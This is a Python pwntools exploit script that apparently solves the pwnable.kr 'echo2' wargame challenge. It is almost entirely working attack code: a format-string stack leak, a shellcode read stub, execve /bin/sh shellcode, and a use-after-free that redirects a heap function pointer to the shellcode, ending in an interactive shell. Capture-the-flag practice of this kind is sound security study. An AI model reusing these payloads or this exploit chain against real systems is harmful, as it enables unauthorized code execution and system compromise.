from pwn import *

#context.log_level='debug'

leaked_satck_addr = 0x7fffffffde30
id_addr = 0x7fffffffde10
offset = leaked_satck_addr - id_addr

print("[*] read(3) shellcode:")
print("[*] Reads 32 bytes from stdin to the stack, to place the /bin/sh shellcode on the stack")
read_shellcode = "\x48\x31\xC0\x48\x31\xFF\x48\x89\xE6\x48\xC7\xC2\x21\x00\x00\x00\x0F\x05\xFF\xE4"
print("[*] Length:", len(read_shellcode))

print("[*] /bin/sh 27 byte shellcode (https://shell-storm.org/shellcode/files/shellcode-806.php)")
binsh_shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print("[*] Length:", len(binsh_shellcode))

p = remote('pwnable.kr', 9011)
print("[*] Get echo2's buffer address by leaking a stack address and calculating with offset")
print(p.recv())
p.sendline(read_shellcode)
#p.sendline('\xcc')
p.recvuntil('> ')
p.sendline('2')
print(p.recv())
p.sendline('%10$p') # leak a stack address
line = p.recvline()
print("leaked_satck_addr:", line)
leaked_satck_addr = int(line.split()[-1], 16)
id_addr =  leaked_satck_addr - offset
print("id addr:", id_addr)

print("[*] place shellcode on the stack")
p.recvuntil('> ')
p.sendline('2')
print(p.recv())
p.sendline(binsh_shellcode)

print("[*] activate uaf bug")
p.recvuntil('> ')
p.sendline('4')
print(p.recv())
p.sendline('n')

print("[*] place the address of the buffer on the heap, to call it")
heap_payload = cyclic(24) + p64(id_addr)
p.recvuntil('> ')
p.sendline('3')
print(p.recv())
p.sendline(heap_payload)
p.sendline(binsh_shellcode)
#p.sendline('\xcc')
p.interactive()
